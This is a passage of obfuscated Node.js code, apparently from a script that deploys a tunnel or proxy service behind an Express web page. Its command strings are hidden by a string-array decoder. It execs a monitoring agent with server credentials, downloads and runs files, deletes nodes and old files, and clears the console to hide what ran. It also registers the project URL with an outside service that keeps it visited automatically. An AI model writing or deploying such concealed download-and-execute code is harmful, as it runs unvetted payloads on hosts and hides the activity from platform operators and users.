NEZHA_SERVER&&NEZHA_KEY&&_0x5dd98e[_0x216eb0(0xdc)](phpPath);process[_0x216eb0(0xf9)]===_0x216eb0(0xda)?exec(_0x216eb0(0x118)+_0x5dd98e[_0x216eb0(0x8b)]('\x20')+_0x216eb0(0x123),_0xbefc79=>{const _0x577a6f=_0x216eb0;console[_0x577a6f(0xf3)](),console[_0x577a6f(0xe5)](_0x577a6f(0x8f)),console[_0x577a6f(0xe5)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x216eb0(0x74)+_0x5dd98e[_0x216eb0(0x8b)]('\x20')+_0x216eb0(0x81),_0x3008c1=>{const _0x51eca5=_0x216eb0;console['clear'](),console[_0x51eca5(0xe5)]('App\x20is\x20running'),console[_0x51eca5(0xe5)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2dd15a=_0x482514;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2dd15a(0xe5)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x289045=await axios[_0x2dd15a(0x96)](_0x2dd15a(0x122),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2dd15a(0x77)}});return console[_0x2dd15a(0xe5)](_0x2dd15a(0x91)),_0x289045;}catch(_0x125a24){return console[_0x2dd15a(0x136)](_0x2dd15a(0x80)+_0x125a24[_0x2dd15a(0xad)]),null;}}async function startserver(){const _0x13343d=_0x482514;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x37901d){console[_0x13343d(0x136)](_0x13343d(0x8e),_0x37901d);}}startserver()[_0x482514(0xa9)](_0x1f7e55=>{const _0x38ec15=_0x482514;console[_0x38ec15(0x136)](_0x38ec15(0x103),_0x1f7e55);}),app[_0x482514(0x85)]('/',async function(_0x13f17a,_0x3282bc){const _0x2cd337=_0x482514;try{const _0x51ba23=path['join'](__dirname,_0x2cd337(0x9e)),_0x48a576=await fs[_0x2cd337(0xdb)]['readFile'](_0x51ba23,_0x2cd337(0xe3));_0x3282bc[_0x2cd337(0x117)](_0x48a576);}catch(_0x589932){_0x3282bc['send'](_0x2cd337(0x7c));}}),app[_0x482514(0xc4)](PORT,()=>console[_0x482514(0xe5)](_0x482514(0x137)+PORT+'!'));
